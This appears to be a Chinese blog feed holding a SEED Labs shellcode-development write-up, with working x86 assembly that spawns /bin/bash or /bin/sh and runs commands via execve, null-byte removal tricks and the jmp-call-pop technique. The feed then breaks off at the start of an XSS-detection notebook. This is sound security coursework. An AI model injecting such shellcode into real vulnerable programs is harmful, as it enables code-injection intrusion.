    <content type="html"><![CDATA[<h1 id="overview">1 Overview</h1><p>shellcode 广泛应用于许多涉及代码注入的攻击中。编写 shellcode相当具有挑战性。 虽然我们可以很容易地从互联网上找到现有的shellcode，但在某些情况下，我们必须编写一个满足某些特定要求的shellcode。此外，能够从头开始编写自己的 shellcode总是令人兴奋的。shellcode中涉及多种有趣的技术。本实验室的目的是帮助学生了解这些技术，以便他们能够编写自己的shellcode。</p><p>编写 shellcode有几个难点，一个是确保二进制文件中没有零，另一个是找出命令中使用的数据地址。第一个难题并不难解决，而且有多种解决方法。第二个难题的解决方案导致了两种典型的shellcode编写方法。一种方法是在执行过程中将数据推入堆栈，这样就可以从堆栈指针中获取它们的地址。在第二种方法中，数据存储在代码区，紧随调用指令之后。执行调用指令时，数据地址被视为返回地址，并被推入堆栈。这两种解决方案都非常优雅，希望同学们能学会这两种技术。本实验包括以下内容：</p><ul><li>shellcode</li><li>汇编代码</li><li>反汇编</li></ul><h1 id="task-1-writing-shellcode">2 Task 1: Writing Shellcode</h1><p>在本任务中，我们将首先从 shellcode 示例开始，演示如何编写shellcode。然后，我们要求学生修改代码以完成各种任务。</p><p>shellcode 通常使用汇编语言编写，而汇编语言取决于计算机体系结构。我们将使用英特尔体系结构，该体系结构有两种处理器：x86（32 位 CPU）和x64（64 位 CPU）。在本任务中，我们将重点关注 32 位shellcode。在最后一项任务中，我们将切换到 64 位shellcode。尽管现在大多数计算机都是 64 位计算机，但它们仍可运行 32位程序。</p><h2 id="task-1.a-the-entire-process">2.1 Task 1.a: The EntireProcess</h2><p>在本任务中，我们提供了一个基本的 x86shellcode，向学生展示如何从头开始编写 shellcode。学生可以从实验室的网站上下载该代码，完成本任务中描述的整个过程。代码如下所示。注意：请不要复制和粘贴此 PDF文件，因为复制和粘贴时可能会更改某些字符。请从实验室网站下载该文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501044.png"alt="image-20231208141910084" /><figcaption aria-hidden="true">image-20231208141910084</figcaption></figure><p><strong>编译为目标代码</strong>：我们使用 nasm 来编译上面的汇编代码(mysh.s)，它是英特尔 x86 和 x64 架构的汇编器和反汇编器。-f elf32选项表示我们要将代码编译为 32 位 ELF 二进制格式。The Executable andLinkableFormat（ELF）是可执行文件、目标代码和共享库的通用标准文件格式。对于 64位汇编代码，应使用 elf64。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nasm -f elf32 mysh.s -o mysh.o<br></code></pre></td></tr></table></figure><p><strong>链接生成最终二进制文件</strong>：得到目标代码mysh.o后，如果我们想生成可执行的二进制文件，可以运行链接程序ld，这是编译的最后一步。-m elf i386 选项表示生成 32 位 ELF二进制文件。完成这一步后，我们就能得到最终的可执行代码mysh。如果运行它，我们就能得到一个 shell。在运行 mysh之前和之后，我们使用 echo $$ 打印出当前 shell 的进程ID，因此我们可以清楚地看到 mysh 确实启动了一个新的 shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ld -m elf_i386 mysh.o -o mysh<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> $$<br>25751  <span class="hljs-comment"># the process ID of the current shell</span><br>$ mysh<br>$ <span class="hljs-built_in">echo</span> $$<br>9760   <span class="hljs-comment"># the process ID of the new shell</span><br></code></pre></td></tr></table></figure><p><strong>获取机器代码</strong>：在攻击过程中，我们只需要 shellcode的机器代码，而不需要包含实际机器代码以外数据的独立可执行文件。从技术上讲，只有机器代码才被称为shellcode。因此，我们需要从可执行文件或目标文件中提取机器代码。有多种方法可以做到这一点。一种方法是使用<code>objdump</code>命令反汇编可执行文件或对象文件。</p><p>汇编代码有两种不同的常用语法模式，一种是 AT&amp;T 语法模式，另一种是Intel 语法模式。默认情况下，objdump 使用 AT&amp;T模式。在下文中，我们使用 -Mintel 选项以 Intel 模式生成汇编代码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501045.png"alt="image-20231208142415245" /><figcaption aria-hidden="true">image-20231208142415245</figcaption></figure><p>在上述打印输出中，高亮显示的数字是机器码。您也可以使用<code>xxd</code>命令打印出二进制文件的内容，这样就能从打印输出中找出shellcode 的机器码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501047.png"alt="image-20231208142447134" /><figcaption aria-hidden="true">image-20231208142447134</figcaption></figure><p><strong>在攻击代码中使用shellcode</strong>：在实际攻击中，我们需要在攻击代码（如 Python 或 C程序）中加入shellcode。我们通常会将机器代码存储在数组中，但如果手动将上面打印的机器代码转换为Python 和 C程序中的数组赋值，则会相当繁琐，尤其是当我们需要在实验室中多次执行此过程时。我们编写了以下Python 代码来帮助这一过程。只需复制从 xxd 命令中得到的内容（只包括shellcode部分），然后粘贴到下面的代码中，在标有""""的行之间。代码可从实验室网站下载。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501048.png"alt="image-20231208142539772" /><figcaption aria-hidden="true">image-20231208142539772</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501049.png"alt="image-20231208142552435" /><figcaption aria-hidden="true">image-20231208142552435</figcaption></figure><p>convert.py 程序将打印出以下 Python代码，您可以将其加入攻击代码中。它将 shellcode 保存在一个 Python数组中。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501050.png"alt="image-20231208142638998" /><figcaption aria-hidden="true">image-20231208142638998</figcaption></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>程序生命周期（源自CSAPP）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938146.png"alt="image-20231017191745744" /><figcaption aria-hidden="true">image-20231017191745744</figcaption></figure></li><li><p>大端模式和小端模式.大多数英特尔 CPU都使用小端模式，本实验采用的也是小端模式.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938147.png"alt="image-20231017191842781" /><figcaption aria-hidden="true">image-20231017191842781</figcaption></figure></li><li><p>使用<code>nasm</code>编译汇编代码(mysh.s)，通过<code>ld</code>链接得到可执行文件.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938148.png"alt="image-20231017191935519" /><figcaption aria-hidden="true">image-20231017191935519</figcaption></figure></li><li><p>通过<code>./mysh</code>运行最终的可执行代码 mysh.执行前后使用echo$$查看当前shell进程的id，从而验证是否成功开启了新的shell.通过下图可以看到执行前后shell进程ID发生了变化.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938149.png"alt="image-20231017192027041" /><figcaption aria-hidden="true">image-20231017192027041</figcaption></figure></li><li><p>利用<code>objdump</code>进行反汇编，从可执行文件或目标文件中提取机器代码（<code>–-disassemble</code>表示反汇编，可以使用<code>-d</code>代替）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938150.png"alt="image-20231017192108808" /><figcaption aria-hidden="true">image-20231017192108808</figcaption></figure></li><li><p>使用 xxd 命令打印出二进制文件的内容，可以从打印输出的内容中找出shellcode的机器码,此步骤是为了方便进行复制(<code>-p</code>表示列之间不需要空格，<code>-c 20</code>表示一行有20个字符)</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938151.png"alt="image-20231017192203497" /><figcaption aria-hidden="true">image-20231017192203497</figcaption></figure></li><li><p>提取出目标序列，先复制到convert.py中，然后运行conver.py得到shellcode。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938152.png"alt="image-20231017192221909" /><figcaption aria-hidden="true">image-20231017192221909</figcaption></figure></li></ol><h2 id="task-1.b.-eliminating-zeros-from-the-code">2.2 Task 1.b.Eliminating Zeros from the Code</h2><p>Shellcode广泛用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制（如 strcpy()函数）引起的。在这些字符串复制函数中，0被视为字符串的结尾。因此，如果我们在 shellcode中间有一个零，字符串复制将无法从该 shellcode复制零之后的内容到目标缓冲区，因此攻击将无法成功。</p><p>虽然并非所有漏洞都有零的问题，但机器代码中不能有任何零，这已成为shellcode 的一项要求；否则，shellcode 的应用将受到限制。</p><p>有许多技术可以去除 shellcode 中的零。代码 mysh.s需要在四个不同的地方使用零。请找出所有这些地方，并解释代码如何在不引入零的情况下使用零。下面给出了一些提示：</p><ul><li><p>如果我们想给 eax 赋0，可以使用<code>mov eax, 0</code>，但这样做会在机器码中得到一个0。解决这个问题的典型方法是使用<code>xor eax, eax</code>。请解释为什么这样做可行。</p></li><li><p>如果我们要将 0x00000099 存储到eax。我们不能直接使用<code>mov eax, 0x99</code>，因为第二个操作数实际上是0x00000099，其中包含三个 0。为了解决这个问题，我们可以先将 eax 设置为0，然后向 al 寄存器（即 eax 寄存器的最小有效 8 位）分配一个字节的数字0x99。</p></li><li><p>另一种方法是使用移位。在下面的代码中，首先将 0x237A7978 分配给ebx。x、y、z 和 # 的 ASCII 值分别为0x78、0x79、0x7a、0x23。由于大多数英特尔 CPU使用小端存储，最小有效字节是存储在较低地址的字节，因此 xyz#显示的数字实际上是 0x237A7978。使用 objdump反汇编代码时就能看到这一点。</p><p>将数字赋值给 ebx 后，我们将寄存器左移 8 位，这样最有意义的字节 0x23将被推出并丢弃。然后，我们将寄存器向右移动 8位，这样最有意义的字节将被填充为 0x00。之后，ebx 将包含0x007A7978，相当于 "xyz/0"，即该字符串的最后一个字节变为 0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ebx, &quot;xyz#&quot;<br>shl ebx, 8<br>shr ebx, 8<br></code></pre></td></tr></table></figure></li></ul><p><strong>任务</strong>：在 shellcode mysh.s 的第➊行，我们将"//sh"推入堆栈。实际上，我们只是想将"/sh "推入堆栈，但推入指令必须推入一个 32位的数字。因此，我们在开头加了一个多余的/；对于操作系统来说，这相当于只加了一个 /。</p><p>在本任务中，我们将使用 shellcode 执行 /bin/bash，其命令字符串有 9个字节（如果算上末尾的 0，则有 10个字节）。通常情况下，要将该字符串推入堆栈，我们需要使长度为 4的倍数，因此我们要将该字符串转换为 /bin////bash。</p><p>但是，在这项任务中，不允许在字符串中添加任何多余的/，即命令的长度必须是 9字节（/bin/bash）。请演示如何做到这一点。除了证明您可以得到一个 bashshell 外，您还需要证明您的代码中没有 0。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码 mysh.s需要在四个不同的地方使用零.请指出所有这些地方，并解释代码如何使用零，但又不在代码中引入零.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501051.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ul><li><p>eax置0：相同值逐位异或得到全零</p></li><li><p>使用eax（第一步构造得到）作为字符串终止符，而不是直接使用0x00</p></li><li><p>edx置0：相同值逐位异或得到全零</p></li><li><p>eax=0x0000000b：直接赋值moveax,0x0000000b会出现截止符，所有先使用异或将eax置0，再将0x0b赋值给eax的低8位</p></li></ul></li><li><p>执行/bin/bash，并且不可以有多余的/.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      mov eax, &quot;h###&quot;;eax=23232368<br>      shl eax, 24;左移24位,eax=68000000<br>      shr eax, 24;右移24位,eax=00000068<br>      push eax<br>      push &quot;/bas&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      xor eax, eax; eax=0<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin/bash&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li><li><p>先进行编译链接，然后反汇编查看机器代码，确认没有0x00</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938154.png"alt="image-20231017192810335" /><figcaption aria-hidden="true">image-20231017192810335</figcaption></figure></li><li><p>执行mysh_1b，成功得到一个shell.注：需要以管理员权限运行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938155.png"alt="image-20231017192830367" /><figcaption aria-hidden="true">image-20231017192830367</figcaption></figure></li></ol><h2 id="task-1.c.-providing-arguments-for-system-calls">2.3 Task 1.c.Providing Arguments for System Calls</h2><p>在 mysh.s 第 ➋ 和 ➌ 行，我们为 execve() 系统调用构造了 argv[]数组。由于我们的命令是 /bin/sh，没有任何命令行参数，因此 argv数组只包含两个元素：第一个元素是指向命令字符串的指针，第二个元素为0。</p><p>在这项任务中，我们需要运行以下命令，即使用 execve执行以下命令，该命令使用 /bin/sh 执行 "ls -la "命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/sh -c <span class="hljs-string">&quot;ls -la&quot;</span><br></code></pre></td></tr></table></figure><p>在这条新命令中，argv数组应包含以下四个元素，所有元素都需要在堆栈中构建。请修改mysh.s，并演示您的执行结果。与往常一样，您的 shellcode 中不能有0（允许使用多余的 /）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">argv</span>[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span><br><span class="hljs-attribute">argv</span>[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;ls -la&quot;</span><br><span class="hljs-attribute">argv</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span><br><span class="hljs-attribute">argv</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p><strong>实验流程：</strong></p><ol type="1"><li>execve()函数原型：filename:准备载入当前进程空间的新程序的路径名.既可以是绝对路径，又可以是相对路径；argv[]:指定了传给新程序的命令行参数，该数组对应于c语言main函数的argv参数数组，格式也相同，argv[0]对应命令名，通常情况下该值与filename中的basename(就是绝对路径的最后一个)相同；envp[]:最后一个参数envp指定了新程序的环境列表，参数envp对应于新程序的environ数组。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938156.png"alt="image-20231017193028508" /><figcaption aria-hidden="true">image-20231017193028508</figcaption></figure><ol start="2" type="1"><li><p>系统调用是通过<code>int 0x80</code>来实现的，对于该函数，寄存器eax放execve的系统调用号11；寄存器ebx放文件路径，即第一个参数；寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要<strong>以空指针(NULL)结束</strong>；寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组.</p></li><li><p>构造参数数组，先将参数压入栈，再从右至左依次将参数指针压入栈.argv[3]=0，作为结尾空指针；argv[2]= "ls -la",使用移位操作构造0；argv[1] ="-c"，同样通过移位操作构造0；argv[0] =points"/bin//sh".最后，依次将参数指针压入栈，把argv[]地址赋值给ecx.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      mov eax, &quot;la##&quot;<br>      shl eax, 16<br>      shr eax, 16 <br>      push eax<br>      push &quot;ls -&quot;; argv[2] = &quot;ls -la&quot;<br>      mov ecx,esp; argv[2] point<br>      <br>      mov eax, &quot;-c##&quot;<br>      shl eax, 16<br>      shr eax, 16<br>      push eax          ; argv[1] = &quot;-c&quot;<br>      mov edx,esp; argv[1] point<br>      <br>      xor eax,eax; <br>      push eax; argv[3] NULL point<br>      push ecx; argv[2] points &quot;ls -la&quot;<br>      push edx; argv[1] points &quot;-c&quot;<br>      push ebx    ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp  ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure></li><li><p>编译链接，运行可执行文件，成功运行目标命令。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938158.png"alt="image-20231017193236306" /><figcaption aria-hidden="true">image-20231017193236306</figcaption></figure></li></ol><h1 id="task-2-using-code-segment">3 Task 2: Using Code Segment</h1><p>我们可以从任务 1 中的 shellcode看到，它解决数据地址问题的方法是<strong>在堆栈上动态构建所有必要的数据结构</strong>，这样就可以从堆栈指针esp 中获取它们的地址。</p><p>还有另一种方法可以解决同样的问题，即获取所有必要数据结构的地址。在这种方法中，<strong>数据存储在代码区中，其地址通过函数调用机制获取</strong>。让我们看看下面的代码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501052.png"alt="image-20231208145244259" /><figcaption aria-hidden="true">image-20231208145244259</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081501053.png"alt="image-20231208145252839" /><figcaption aria-hidden="true">image-20231208145252839</figcaption></figure><p>上面的代码首先跳转到位置 2 的指令，然后执行另一次跳转（跳转到位置1），但这次使用的是调用指令。这条指令用于函数调用，即在跳转到目标位置之前，先记录下一条指令的地址作为返回地址，这样当函数返回时，就可以返回到调用指令之后的指令。</p><p>在本例中，调用指令后的 "指令"（第 ➋行）实际上不是指令，而是存储字符串的指令。不过，这并不重要，调用指令会将其地址（即字符串的地址）推入堆栈，即函数帧的返回地址字段。当我们进入函数时，即跳转到位置1 后，堆栈顶部就是返回地址的存储位置。因此，第➊行的 pop ebx指令实际上是获取第➋行的字符串地址，并将其保存到 ebx 寄存器中。这就是获取字符串地址的方法。</p><p>第 ➋行的字符串并不是一个完整的字符串，它只是一个占位符。程序需要在这个占位符中构建所需的数据结构。既然已经获得了字符串的地址，那么在这个占位符内构建的所有数据结构的地址都可以很容易地推导出来。</p><p>如果我们想获得可执行文件，就需要在运行链接程序 (ld) 时使用 --omagic选项，这样代码段才是可写的。默认情况下，代码段是不可写的。程序运行时，需要修改代码段中存储的数据；如果代码段不可写，程序就会崩溃。这对实际攻击来说不是问题，因为在攻击中，代码通常被注入到可写数据段（如堆栈或堆）中。我们通常不会将shellcode 作为独立程序运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nasm -f elf32 mysh2.s -o mysh2.o<br>$ ld --omagic -m elf_i386 mysh2.o -o mysh2<br></code></pre></td></tr></table></figure><p>任务。您需要完成以下任务：（1）请对 mysh2.s中的每一行代码进行详细解释，从标有 "1 "的一行开始。(2) 请使用 mysh2.s中的技术实现一个新的 shellcode，使其执行/usr/bin/env，并打印出以下环境变量：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span><span class="hljs-number">11</span><br><span class="hljs-attribute">b</span><span class="hljs-operator">=</span><span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>mysh2.s代码理解：首先执行jmp shorttwo语句，跳转到two中执行，two中调用one，再跳转到one中执行。这段汇编代码的主要目的是使用execve系统调用来执行/bin/sh程序。argv[]数组：argv[0]=字符串（shellcode）地址，存储于[ebx+8]位置；argv[1]=NULL指针，存储于[ebx+12]位置.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>BITS 32<br>jmp short two<br>    one:<br>        pop ebx# ebx=字符串(shellcode)地址<br>        xor eax, eax# eax=0<br>        mov [ebx+7], al# [ebx+7]=0  前8字节内容：/bin/sh\0<br>        mov [ebx+8], ebx   # 赋值前：[ebx+8]=AAAA  赋值后：[ebx+8]=字符串(shellcode)地址<br>        mov [ebx+12], eax# 赋值后：[ebx+12]=BBBB 赋值后：[ebx+12]=0<br>        lea ecx, [ebx+8] # ecx=argv[]地址<br>        xor edx, edx# edx=0 即无环境变量<br>        mov al,  0x0b# eax=11（十进制）即系统调用号<br>        int 0x80# 执行系统调用<br>    two:<br>        call one# 调用one函数，将下一条语句地址压入栈，作为ret，再跳转到one中继续执行<br>        db &#x27;/bin/sh*AAAABBBB&#x27; # shellcode<br></code></pre></td></tr></table></figure></li><li><p>目标：执行命令<code>/usr/bin/env -i a=11 b=22</code>.该命令用于清除环境变量并为两个特定变量a 和 b 设置新的值.</p><ul><li><p>代码编写：代码工作主要集中在argv[]的构造。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>BITS 32<br>jmp short two<br>    one:<br> pop ebx;ebx=address of shellcode<br> xor eax, eax<br><br>        mov [ebx+12], al<br>        mov [ebx+15], al<br>        mov [ebx+20], al<br>        mov [ebx+25], al;Replace the placeholder with zero<br><br>;Construct argv[];Before assignment:[ebx+26]=AAAA<br>        mov [ebx+26],ebx ;After  assignment:[ebx+26]=address of &quot;/usr/bin/env\0&quot;  argv[0]<br>        <br>        lea eax,[ebx+13];Before assignment:[ebx+30]=BBBB<br>        mov [ebx+30],eax ;After  assignment:[ebx+30]=address of &quot;-i\0&quot;argv[1]<br>        <br>        lea eax,[ebx+16];Before assignment:[ebx+34]=CCCC<br>        mov [ebx+34],eax ;After  assignment:[ebx+34]=address of &quot;a=11\0&quot;argv[2]<br>        <br>        lea eax,[ebx+21];Before assignment:[ebx+38]=DDDD<br>        mov [ebx+38],eax ;After  assignment:[ebx+38]=address of &quot;b=22\0&quot;argv[3]<br><br>        xor eax,eax<br>        mov [ebx+42],eax ;argv[4]=NULL point<br>  <br><br>        lea ecx, [ebx+26] ;ecx = address of &quot;/usr/bin/env -i a=11 b=22&quot;<br> xor edx, edx;edx = 0 No environment variables<br> mov al,  0x0b;eax = 0x0bSystem call number<br> int 0x80;Start system call<br>     two:<br> call one<br> db &#x27;/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE&#x27;<br>      ;0    5    1    5    2    5    3    5    4    5<br></code></pre></td></tr></table></figure></li><li><p>编译链接执行，成功打印环境变量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938160.png"alt="image-20231017193616472" /><figcaption aria-hidden="true">image-20231017193616472</figcaption></figure></li></ul></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://gls.show/p/a10ed24d/#Task-2-Using-Code-Segment">SEED-lab：ShellcodeDevelopment Lab - 郭佳明的博客 (gls.show)</a></li><li><ahref="https://seanxz401.github.io/2022/12/27/网络攻防-shellcode编写/#Task2">网络攻防-shellcode编写- Sean's Blog (seanxz401.github.io)</a></li><li><ahref="https://blog.csdn.net/qq_33955922/article/details/53956547">Linux执行新程序：execve() 函数_execve函数-CSDN博客</a></li><li><ahref="https://blog.csdn.net/m0_55368674/article/details/128673160">系统调用功能号与execve函数详解_Razors_的博客-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Software Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS攻击代码检测</title>
    <link href="/2023/10/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E8%B7%B5%E7%AF%87/XSS%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"/>
    <url>/2023/10/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E8%B7%B5%E7%AF%87/XSS%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="code">Code</h1><h2 id="导入模块">1. 导入模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.svm <span class="hljs-keyword">import</span> SVC<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score, recall_score<br><span class="hljs-keyword">import</span> joblib<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br></code></pre></td></tr></table></figure><h2 id="数据预处理">2. 数据预处理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取数据</span><br>normal_data = pd.read_csv(<span class="hljs-string">&#x27;./data/data52101/dmzo_nomal.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br>xss_data = pd.read_csv(<span class="hljs-string">&#x27;./data/data52101/xssed.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># 创建标签</span><br>normal_data[<span 